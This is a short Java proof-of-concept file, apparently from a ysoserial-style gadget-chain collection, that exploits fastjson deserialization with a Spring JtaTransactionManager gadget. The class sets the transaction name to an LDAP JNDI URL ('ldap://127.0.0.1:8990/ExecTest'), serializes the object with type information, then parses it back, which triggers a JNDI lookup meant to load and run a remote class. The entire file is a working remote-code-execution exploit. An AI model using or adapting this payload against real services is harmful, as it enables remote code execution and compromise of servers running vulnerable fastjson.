package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.springframework.transaction.jta.JtaTransactionManager;

import java.io.File;
import java.lang.reflect.Method;

public class Poc2 {
    public static void main(String[] args) throws NoSuchMethodException {
        //2
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("ldap://127.0.0.1:8990/ExecTest");
        String poc = JSON.toJSONString(jtaTransactionManager, SerializerFeature.WriteClassName);
        System.out.println(poc);
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
